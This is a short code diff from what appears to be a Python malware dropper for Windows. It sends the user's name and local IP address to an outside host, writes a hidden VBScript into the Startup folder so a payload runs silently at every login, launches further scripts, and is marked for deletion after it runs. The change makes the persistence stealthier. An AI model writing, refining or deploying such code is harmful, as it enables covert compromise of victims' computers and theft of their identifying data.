@@ -20,11 +20,11 @@ with open("fun.py","wb") as f:
 
 requests.get(f'{file_host}/{getpass.getuser()}/{socket.gethostbyname(socket.gethostname())}')
 
-with open(f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\open.bat', "w+") as bat_file:
-    bat_file.write(f'pythonw "C:\\Users\\{getpass.getuser()}\\Videos\\file.pyw"')
+with open(f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\open.vbs', "w+") as file:
+    file.write(f'CreateObject("Wscript.Shell").Run "pythonw C:\\Users\\{getpass.getuser()}\\Videos\\file.pyw",0,True')
 
 
-os.system('pythonw "C:\\Users\\{getpass.getuser()}\\Videos\\file.py"')
+os.system('pythonw "C:\\Users\\{getpass.getuser()}\\Videos\\file.pyw"')
 os.system('start python fun.py')
 
 # delete this file after running it
